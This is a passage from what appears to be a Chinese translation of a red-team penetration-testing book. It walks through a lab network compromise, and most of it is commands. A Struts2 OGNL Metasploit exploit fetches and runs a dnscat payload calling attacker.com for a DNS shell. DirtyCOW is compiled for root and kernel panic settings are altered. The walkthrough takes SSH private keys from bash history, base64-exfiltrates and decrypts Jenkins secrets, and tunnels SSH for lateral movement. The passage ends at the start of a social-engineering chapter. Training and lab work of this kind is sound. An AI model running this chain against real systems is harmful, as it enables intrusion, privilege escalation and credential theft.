search struts2
use exploit/multi/http/struts2_content_type_ognl
配置 struts2漏洞以获取我们的 dnscat payload 并在受害者服务器上执行。确保在前面更
新你的 IP 和密钥。
set RHOST 172.16.250.10
set RPORT 80
set TARGETURI struts2-showcase/showcase.action
set PAYLOAD cmd/unix/generic
set CMD wget http:///dnscat -O /tmp/dnscat && chmod+x /tmp/dnscat &&
/tmp/dnscat --dns server=attacker.com，port=53 --secret=
run
一旦 payload 执行，你将不会在 Metasploit 中得到任何确认，因为我们使用了 dnscat 的
payload。你需要检查你的 dnscat 服务器是否有任何使用 DNS 流量的连接。
158
第4章 带球——开始攻击网络
回到 dnscat2服务器上，检查新执行的 payload 并创建一个 shell 终端。
与第一个 payload 进行交互
window -i 1
生成 shell 进程
shell
用键盘按钮返回主菜单
ctrl + z
与新 shell 进行交互
window -i 2
键入 shell 命令
ls
159
第4章 带球——开始攻击网络
你已经入侵了 OpenCMS/Apache Struts 服务器！现在要做什么？你需要花一些时间检查服务
器并寻找有趣的信息。你想起来服务器正在运行 OpenCMS Web 应用程序，并确定该应用程
序是在 /opt/tomcat/webapps/kittens 下配置的。在查看 OpenCMS 属性的配置文件时，我们
发现数据库、用户名、密码和 IP 地址为 172.16.250.10。
检索数据库信息：
cat /opt/tomcat/webapps/kittens/WEB-INF/config/opencms.properties
我们成功连接到数据库了，但看不到太多信息。这是因为我们目前是一个有限的 Tomcat 用
户，这确实阻碍了我们的攻击。因此，我们需要找到一种提权的方法。在服务器上运行 post
exploitation reconnaissance（uname -a && lsb_release -a），你可以识别出这是一个非常旧
的 Ubuntu 版本。幸运的是，此服务器容易受到权限提升漏洞 DirtyCOW 的攻击。让我们创建
一个 DirtyCOW 二进制文件并转到根目录！
Escalation 提升 dnscat 权限：
下载并编译目录：
cd /tmp
wget http://bit.ly/2vdh2Ub -O dirtycow-mem.c
gcc -Wall -o dirtycow-mem dirtycow-mem.c -ldl -lpthread
./dirtycow-mem
尝试保持 DirtyCOW 漏洞利用的稳定性，并允许内核崩溃时重新启动。
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
echo 1 > /proc/sys/kernel/panic && echo 1 > /proc/sys/kernel/panic_on_oops &&
echo 1 > /proc/sys/kernel/panic_on_unrecovered_nmi && echo 1 >
/proc/sys/kernel/panic_on_io_nmi && echo 1 > /proc/sys/kernel/panic_on_warn
whoami
160
第4章 带球——开始攻击网络
注意：DirtyCOW 不是一个非常稳定的提权方法。如果你对漏洞利用过程有问题，请查看我的
Github 页面，在这里了解创建 setuid 二进制文件的更稳定的过程：
https://raw.githubusercontent.com/cheetz/dirtycow/master/THP-Lab
如果仍然有问题，另一个选项是通过 SSH 登录到初始服务器，并以 root 身份执行
dnscat payload。要登录，请使用凭据 hacker/changeme 登录系统并使用 sudo-su 获得
root 权限。
现在，由于主机系统上没有补丁，你已经成为系统的 root 用户。当你再次开始为敏感信息翻
阅系统文件时，你会看到 root 的 bash 历史文件。在这个文件中，你可以找到 SSH 命令和私
有 SSH 密钥来源。我们可以使用此 SSH 密钥并登录到第二个系统172.16.250.30：
cat ~/.bash_history
head ~/.ssh/id_rsa
ssh -i ~/.ssh/id_rsa PI:EMAIL
161
第4章 带球——开始攻击网络
你花了一些时间在第二个系统上，试着理解它的用途。在四处搜索时，你注意到在 /home 目
录中有一个 Jenkins 用户，它引导你识别在端口8080上运行的 Jenkins 服务。我们如何使用
浏览器查看 Jenkins 服务器上的内容？这就是 dnscat 的端口转发功能发挥作用的地方。我们
需要退出最初的shell，去命令终端。从那里，我们需要设置一个监听器，通过 dnscat 将我们
的流量从攻击者机器转发到端口8080上的 Jenkins Box（172.16.250.30)。
执行 dnscat 端口转发：
退出现有的 shell
Ctrl + z
返回我们的第一个命令代理并设置一个监听器/端口转发：
window -i 1
listen 127.0.0.1:8080 172.16.250.30:8080
在你的 Kali 虚拟机上，使用我们的端口转发代理打开浏览器并打开下面的地址（这将比
dns 慢一些）：
http://127.0.0.1:8080/jenkins
162
第4章 带球——开始攻击网络
在 Jenkins 应用程序内的凭证管理器内部，我们将看到 db_backup 用户密码已存储，但不可
见。 我们需要弄清楚如何从 Jenkins 中获取此凭据，以便我们可以继续横向移动。
n00py 对 Jenkins 中存储的凭据以及如何提取它们做了一些很好的研究（
http://bit.ly/2GUIN9s ）。 我们可以使用现有的 shell 来利用此攻击并获取 credentials.xml，
master.key 和 hudson.util.Secret 文件。
返回 dnscat 中的主菜单并与原始 shell 进行交互
Ctrl + z
window -i 2
转到 Jenkins 的主目录并获取三个文件：credentials.xml，master.key 和
hudson.util.Secret。
cd /home/Jenkins
我们可以尝试关闭这些文件，或者我们可以将这些文件作为基础并通过当前的 shell 复制
它们。
base64 credentials.xml
base64 secrets/hudson.util.Secret
base64 secrets/master.key
163
第4章 带球——开始攻击网络
我们可以将 base64输出复制回我们的 Kali 系统并解码它们以破解 db_backup 用户的密
码。
cd /opt/jenkins-decrypt
echo “” | base64 —decode > hudson.util.Secret
echo “” | base64 —decode > master.key
echo “” | base64 —decode > credentials.xml
使用 https://github.com/cheetz/jenkins-decrypt 解密密码
python3 ./decrypt.py master.key hudson.util.Secret credentials.xml
我们能够成功解密 db_backup 用户的密码 )uDvra{4UL^;r？*h 。如果我们回顾一下之前的注
释，我们会在 OpenCMS 属性文件中看到数据库服务器位于 172.16.250.50。看起来这个
Jenkins 服务器出于某种原因会对数据库服务器执行某种备份。让我们检查一下我们是否可以
获取 db_backup 的凭据：利用 )uDvra{4UL^;r？*h 通过 SSH 登录数据库服务器。唯一的问
题是通过我们的 dnscat shell，我们没有直接按标准输入（STDIN）来与 SSH 的密码提示进
行交互。 因此，我们将不得不再次使用我们的端口将我们的 SSH shell 从 Kali 虚拟机通过
dnscat 代理传递到数据库服务器（172.16.250.50）。
回到命令 shell
Ctrl + z
window -i 1
创建一个新的端口转发，从 localhost 转到172.16.250.50的数据库服务器
listen 127.0.0.1:2222 172.16.250.50:22
164
第4章 带球——开始攻击网络
一旦使用 db_backup 帐户进入数据库服务器（172.16.250.50），我们会注意到此帐户是
sudoers 文件的一部分，并且可以 sudo su 到 root。 一旦 root 在数据库服务器上，我们将四
处寻找也找不到任何访问数据库的凭据。我们可以重置 root 数据库密码，但最终可能会破坏
其他一些应用程序。相反，我们搜索位于/var/lib/mysql 下的不同数据库，并发现
cyberspacekittens 数据库。在这里，我们找到 secrets.ibd 文件，其中包含 secrets 表的所有
数据。在我们阅读数据时，我们意识到它可能是加密的...由你来执行剩下的操作...
恭喜！！！你已成功入侵 Cyber Space Kittens 网络！
不要止步于此...你可以用这些系统做很多事情；我们现在只触及了表面。随意在被入侵的系统
上翻阅，找到更敏感的文件，找出其他权限升级的方法，等等。作为参考，在本实验中，环
境拓扑如下所示：
本章总结
165
第4章 带球——开始攻击网络
在本章中，我们经历了入侵网络的一系列操作。 我们开始在外部网络上没有任何凭据或利用
社会工程的方式入侵到我们的第一个受害者系统。从那里开始，我们能够利用目标系统本身
的应用程序，获取有关网络和主机系统的信息，横向移动，权限提升，并最终攻陷整个网
络。这一切都是建立在最少程度的扫描，利用网络特性，并试图逃避所有检测机制之上完成
的。
166
第5章 助攻——社会工程学攻击
第5章 助攻——社会工程学攻击
译者：@Snowming
开始社会工程学攻击行动
作为红队队员，我们钟爱社会工程学攻击。不仅因为它通常包含低技能攻击，而且因为它也
很容易以非常低的成本来策划一场值得我们高度信赖的战役。只需设置几个假域名、服务
器、策划一些电子邮件、假装丢掉一些 bad USB，然后就可以结束一天的工作了。
译者注: 这里提到的低技能攻击， 原文是 low skillset attacks，我的理解是无需太多技能
的攻击，比如踩点、垃圾收集......
在衡量的指标方面，我们一般用捕捉到的明显的信息，例如发送的电子邮件数量、点击了钓
鱼链接的用户数量以及键入密码的用户数量。我们也试图发挥创意，为雇用我们的公司带来
实质性价值。这方面的一个例子是 DefCon 会议举办的的社会工程学竞赛，在这个竞赛中参
赛选手要通过社工的方式来入侵公司和雇员。如果你不熟悉这个竞赛的话，那我简略地介绍
一下：参赛选手们需要在有限的时间内针对目标公司找到一些 flag。通过获取公司信息，如他
们的 VPN 、他们使用的杀毒软件类型、员工的特定信息或让员工访问钓鱼 URL 等方法，可
以捕获 flag。如果你想查看比赛中的使用的所有 flag，请查看2017年的比赛报
告：http://bit.ly/2HlctvY 。 这些类型的攻击可以通过教导员工学会发现恶意行动并向相关负责
团队报告从而帮助公司提高内部安全意识。
167
第5章 助攻——社会工程学攻击
在本章中，我们将粗浅的接触一些用来进行社会工程学攻击的工具和技术。对于社会工程学
攻击，没有正确或错误的答案。只要能发挥作用，在我们的书里就是好的。
近似域名（Doppelganger Domain）
在上本书中我们讲了很多关于近似域名的内容。如今近似域名仍然是获取初始凭证或者植入